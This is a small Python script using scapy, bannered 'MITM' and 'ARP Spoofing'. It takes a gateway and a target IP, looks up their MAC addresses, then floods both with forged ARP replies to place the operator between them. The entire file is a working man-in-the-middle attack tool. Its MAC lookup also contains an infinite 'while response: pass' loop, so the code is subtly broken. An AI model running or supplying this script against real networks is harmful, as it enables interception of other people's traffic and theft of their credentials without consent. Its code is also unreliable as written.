from scapy.all import *
from scapy.layers.l2 import ARP

# colors
reset, bold, orange, blue, purple, cyan, red = '\033[0m', '\033[01m', '\033[33m', '\033[34m', '\033[35m', '\033[36m', '\033[31m'
reset = reset + bold

print(f"""{bold}{purple}
___  ________ ________  ___
|  \/  |_   _|_   _|  \/  |
| .  . | | |   | | | .  . |
| |\/| | | |   | | | |\/| |
| |  | |_| |_  | | | |  | |
\_|  |_/\___/  \_/ \_|  |_/
---------or perets---------{reset}
       ARP Spoofing.       {purple}
---------------------------
""")
try:
    gateway_ip = input(f"{blue}{bold}Enter the gateway IP: {reset}")
    target_ip = input(f"{blue}Enter your target IP: {reset}")


    def mac_ad(ip):
        response, unanswered = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip), retry=2, timeout=10, verbose=0)
        print(f"{orange}\nSpoofing...\n{reset}")
        while response:
            pass


        for a, b in response:
            print(a)
            print(b)
            return b[ARP].hwsrc
        return None


    gateway_mac = mac_ad(gateway_ip)
    target_mac = mac_ad(target_ip)


    def arp_poison(gate_ip, gate_mac, tar_ip, tar_mac):
        while True:
            send(ARP(op=2, pdst=gate_ip, hwdst=gate_mac, psrc=tar_ip))
            send(ARP(op=2, pdst=tar_ip, hwdst=tar_mac, psrc=gate_ip))



    arp_poison(gateway_ip, gateway_mac, target_ip, target_mac)
except KeyboardInterrupt:
    print(f"\n{red}Keyboard interrupt")
